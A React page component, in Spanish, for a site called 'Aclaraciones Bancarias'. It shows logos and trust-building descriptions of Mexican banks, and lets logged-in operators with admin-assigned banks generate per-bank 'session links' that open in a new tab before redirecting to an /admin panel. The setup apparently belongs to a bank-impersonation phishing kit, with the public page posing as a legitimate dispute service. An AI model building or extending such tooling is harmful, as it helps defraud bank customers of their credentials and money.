import React, { useState, useEffect, useMemo } from 'react';
import { useLocation } from 'wouter';
import { useAuth } from '@/hooks/use-auth';
import { useQuery } from '@tanstack/react-query';
import { apiRequest, getQueryFn } from '@/lib/queryClient';
import { useToast } from '@/hooks/use-toast';
import { Loader2 } from 'lucide-react';
import { BankType } from '@shared/schema';

// Importamos los logos de los bancos
import banorteLogoPath from '@assets/Banorte-01.png';
import liverPoolLogoPath from '@assets/logo-brand-liverpool-f-c-design-acaab2087aa7319e33227c007e2d759b.png';
import hsbcLogoPath from '@assets/Hsbc.png';
import banregioLogoPath from '@assets/Banregio.png.png';
import invexLogoPath from '@assets/Invex.png';
import bancoppelLogoPath from '@assets/bancoppel.png';
import plataCardLogoPath from '@assets/Plata_Card_Logo.png';
import scotiaLogoPath from '@assets/Skotia.png';
import amexLogoPath from '@assets/Amex.png';
import bancoAztecaLogoPath from '@assets/Banco_Azteca_Logo.png';
import bienestarLogoPath from '@assets/Logo_Banco_del_Bienestar.png';
import inbursaLogoPath from '@assets/stock_images/banco_inbursa_mexico_fb7d73f6.jpg';
import afirmeLogoPath from '@assets/logoAfirme_1762549994047.png';

// Definir mapa de logos
const bankLogos: Record<string, string> = {
  [BankType.HSBC]: hsbcLogoPath,
  [BankType.BANORTE]: banorteLogoPath,
  [BankType.INVEX]: invexLogoPath,
  [BankType.BANCOPPEL]: bancoppelLogoPath,
  [BankType.LIVERPOOL]: liverPoolLogoPath,
  [BankType.BANREGIO]: banregioLogoPath,
  [BankType.PLATACARD]: plataCardLogoPath,
  [BankType.SCOTIABANK]: scotiaLogoPath,
  [BankType.AMEX]: amexLogoPath,
  [BankType.BANCOAZTECA]: bancoAztecaLogoPath,
  [BankType.BIENESTAR]: bienestarLogoPath,
  [BankType.INBURSA]: inbursaLogoPath,
  [BankType.AFIRME]: afirmeLogoPath,
  [BankType.CITIBANAMEX]: liverPoolLogoPath, // Usar logo de Liverpool como placeholder
  [BankType.BBVA]: liverPoolLogoPath, // Usar logo de Liverpool como placeholder
  [BankType.BANBAJIO]: liverPoolLogoPath, // Usar logo de Liverpool como placeholder
  [BankType.SANTANDER]: liverPoolLogoPath, // Usar logo de Liverpool como placeholder
  [BankType.SPIN]: liverPoolLogoPath // Usar logo de Liverpool como placeholder
};

// Definir mapa de descripciones
const bankDescriptions: Record<string, string> = {
  [BankType.HSBC]: "HSBC te ofrece atención rápida y efectiva para resolver cualquier aclaración sobre tus transacciones.",
  [BankType.BANORTE]: "Banorte está a tu disposición para asegurar que cada transacción sea clara y justa.",
  [BankType.INVEX]: "INVEX te respalda en cada paso para aclarar cualquier movimiento en tus cuentas.",
  [BankType.BANCOPPEL]: "BanCoppel te ofrece soluciones eficientes para resolver cualquier duda sobre tus operaciones bancarias.",
  [BankType.LIVERPOOL]: "Liverpool se compromete a brindarte un servicio de calidad para resolver tus aclaraciones.",
  [BankType.CITIBANAMEX]: "Banamex te acompaña con soluciones confiables y ágiles para resolver todas tus aclaraciones bancarias.",
  [BankType.BANREGIO]: "Banregio está comprometido con tus finanzas y te ofrece el mejor servicio para resolver tus aclaraciones.",
  [BankType.PLATACARD]: "Plata Card te ofrece soluciones rápidas y eficientes para aclarar cualquier movimiento en tu cuenta.",
  [BankType.SCOTIABANK]: "Scotiabank está siempre a tu disposición para atender tus dudas y aclaraciones bancarias.",
  [BankType.AMEX]: "American Express te garantiza soluciones efectivas para todas tus aclaraciones bancarias.",
  [BankType.BANCOAZTECA]: "Banco Azteca te acompaña con atención personalizada para resolver tus aclaraciones de forma rápida y eficiente.",
  [BankType.BIENESTAR]: "Banco del Bienestar está comprometido con brindarte el mejor servicio en aclaraciones bancarias.",
  [BankType.INBURSA]: "Banco Inbursa te ofrece soluciones financieras confiables y ágiles para resolver todas tus aclaraciones bancarias.",
  [BankType.AFIRME]: "Afirme te brinda atención cercana y profesional para resolver tus aclaraciones bancarias con rapidez y eficiencia."
};

export default function BankSelectionPage() {
  const { user } = useAuth();
  const [allowedBanks, setAllowedBanks] = useState<string[]>([]);

  // Obtener los bancos permitidos del usuario
  const { data: allowedBanksData, isLoading } = useQuery({
    queryKey: ['/api/user/allowed-banks'],
    queryFn: async () => {
      const res = await apiRequest('GET', '/api/user/allowed-banks');
      return await res.json();
    },
    enabled: !!user, // Solo ejecutar si hay usuario autenticado
    retry: false
  });

  console.log('[BankSelection] Respuesta de bancos permitidos:', allowedBanksData);

  // Determinar qué bancos mostrar
  const banksToShow = useMemo(() => {
    if (!user) {
      console.log('[BankSelection] No hay usuario, mostrando todos los bancos');
      // Para usuarios no autenticados, mostrar todos los bancos disponibles
      return Object.values(BankType).filter(bank => bank !== BankType.ALL);
    }

    if (!allowedBanksData || !(allowedBanksData as any)?.success) {
      console.log('[BankSelection] No hay datos de bancos permitidos, mostrando todos los bancos como fallback');
      // Si hay error obteniendo los bancos permitidos, mostrar todos como fallback
      return Object.values(BankType).filter(bank => bank !== BankType.ALL);
    }

    const allowed = (allowedBanksData as any)?.allowedBanks || [];
    console.log('[BankSelection] Bancos permitidos del servidor:', allowed);

    return allowed;
  }, [user, allowedBanksData]);

  console.log('[BankSelection] Bancos a mostrar:', banksToShow);
  console.log('[BankSelection] Usuario actual:', user);

  const [selectedBank, setSelectedBank] = useState<BankType | null>(null);
  const [, setLocation] = useLocation();
  const { toast } = useToast();

  const handleBankSelection = async (bankType: BankType) => {
    if (!user) {
      toast({
        title: "Acceso requerido",
        description: "Debes iniciar sesión para generar enlaces de sesión",
        variant: "destructive"
      });
      try {
        setLocation('/auth');
      } catch (error) {
        console.error('Error navigating to auth:', error);
        window.location.href = '/auth';
      }
      return;
    }

    setSelectedBank(bankType);

    try {
      const response = await fetch(`/api/generate-link?banco=${bankType}`);
      const data = await response.json();

      if (!response.ok) {
        throw new Error(data.error || data.message || 'Error generando enlace');
      }

      if (data.link) {
        // Abrir el enlace generado en una nueva pestaña
        window.open(data.link, '_blank');

        // Redirigir al panel de administración en la pestaña actual
        try {
          setLocation('/admin');
        } catch (error) {
          console.error('Error navigating to admin:', error);
          window.location.href = '/admin';
        }
      }
    } catch (error: any) {
      console.error('Error generando enlace:', error);
      toast({
        title: "Error",
        description: error.message || "Error al generar el enlace de sesión",
        variant: "destructive"
      });
    } finally {
      setSelectedBank(null);
    }
  };

  return (
    <div className="min-h-screen bg-[#f9f9f9]">
      <header className="text-center py-10 px-5">
        <h1 className="text-4xl font-bold text-gray-800">Aclaraciones Bancarias</h1>
        <p className="text-xl text-gray-600 mt-2">Porque tu confianza es nuestra prioridad</p>
      </header>

      {isLoading ? (
        <div className="flex justify-center items-center py-10">
          <Loader2 className="h-8 w-8 animate-spin text-primary" />
          <span className="ml-2">Cargando bancos disponibles...</span>
        </div>
      ) : (
        <div className="flex flex-wrap justify-center gap-5 px-5 py-6">
          {banksToShow.map((bank: string) => {
            const logo = bankLogos[bank as keyof typeof bankLogos];
            const description = bankDescriptions[bank as keyof typeof bankDescriptions];

            return (
              <div key={bank} className="bg-white rounded-lg shadow-md w-64 text-center p-5">
                <img 
                  src={logo} 
                  alt={bank} 
                  className="h-16 object-contain mx-auto mb-3"
                />
                <p className="text-sm text-gray-700">{description}</p>
              </div>
            );
          })}

          {banksToShow.length === 0 && (
            <div className="bg-white rounded-lg shadow-md w-full max-w-lg text-center p-8">
              <h3 className="text-xl font-semibold mb-3 text-gray-800">No tienes bancos asignados</h3>
              <p className="text-gray-600">
                No se te han asignado bancos para operaciones. Contacta con el administrador para obtener acceso.
              </p>
            </div>
          )}
        </div>
      )}

      <section className="py-8 px-5 text-center">
        <h2 className="text-3xl font-bold text-gray-800 mb-5">¿Qué es una Aclaración Bancaria?</h2>
        <p className="max-w-4xl mx-auto text-gray-600 leading-relaxed mb-5">
          Una aclaración bancaria es un proceso mediante el cual un cliente solicita la revisión de un movimiento en su cuenta bancaria que considera incorrecto o no autorizado. Este proceso puede incluir cargos no reconocidos, errores en el saldo, o cualquier otra situación que requiera una verificación por parte del banco. Las aclaraciones bancarias son fundamentales para mantener la confianza y seguridad de los clientes en sus instituciones financieras.
        </p>
        <p className="max-w-4xl mx-auto text-gray-600 leading-relaxed">
          Los bancos ofrecen diferentes canales para realizar estas aclaraciones, incluyendo atención en sucursales, llamadas telefónicas, y plataformas en línea. Es importante que los clientes actúen rápidamente al detectar un problema para que el banco pueda investigar y resolver la situación lo antes posible.
        </p>
      </section>

      <section className="py-8 px-5 text-center">
        <h2 className="text-3xl font-bold text-gray-800 mb-5">Aclaraciones con Tarjetas de Crédito</h2>
        <p className="max-w-4xl mx-auto text-gray-600 leading-relaxed mb-6">
          Además de las cuentas bancarias, también puedes realizar aclaraciones por cargos no reconocidos en tus tarjetas de crédito. Este proceso es similar y generalmente requiere contactar a tu banco emisor y presentar una solicitud de aclaración.
        </p>
        <div className="flex justify-center gap-10">
          <img src="https://upload.wikimedia.org/wikipedia/commons/0/04/Visa.svg" alt="Visa" className="h-20 w-auto" />
          <img src="https://upload.wikimedia.org/wikipedia/commons/0/04/Mastercard-logo.png" alt="Mastercard" className="h-20 w-auto" />
          <img src={amexLogoPath} alt="American Express" className="h-20 w-auto" />
        </div>
      </section>

      <footer className="bg-gray-800 text-white text-center py-4 px-3 text-sm">
        © 2024 Aclaraciones Bancarias - Todos los derechos reservados.
      </footer>
    </div>
  );
}